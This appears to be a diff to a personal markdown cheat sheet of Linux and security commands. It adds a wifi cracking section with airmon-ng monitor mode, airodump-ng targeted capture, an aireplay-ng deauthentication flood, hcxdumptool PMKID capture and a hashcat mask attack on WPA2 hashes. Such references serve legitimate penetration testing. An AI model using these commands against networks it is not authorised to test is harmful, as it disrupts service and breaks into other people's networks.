@@ -32,11 +32,6 @@ ___________________
 
 `ip address`
 
-**print wifi cards and their status**
-
-`iwconfig`
-
-`iw dev`
 
 **print public ip address**
 
@@ -74,11 +69,28 @@ ___________________
 
 `iw dev`
 
+**Wifi Scanning & cracking tools**
+Enable monitor mode for wifi card
+`sudo airmon-ng start <interface>`
+**print wifi cards and their status**
+
+`iwconfig`
+
+`iw dev`
+
 **hcxdumptool & hcxpcaptool for hashcat WPA2 PMKID cracking and hash conversion**
 
-`hcxdumptool -i <interface> -w <outputfile> -F --rds=1 --beacontx=10 --gpsd`
+`sudo hcxdumptool -i <interface> -w <outputfile> -F --rds=1 --beacontx=10 --gpsd`
 
 `hashcat -m 22000 <file.hc22000> -a 3 ?d?d?d?d?d?d?d?d?d?d`
+
+scan all wifi APs in range
+`sudo airodump-ng <interface>` 
+
+`sudo airodump-ng <interface> -c <channel> -w <pcap output file> -d <target bssid>`
+
+Deauth wifi AP for EAPOL capture
+`sudo aireplay-ng wlan0 -0 0 -a <bssid>`
 
 **start nessus**
 `sudo systemctl start nessusd.service`
@@ -90,3 +102,5 @@ open browser at https://localhost:8834
 `clamtk`
 
 `rkhunter --check`
+
+
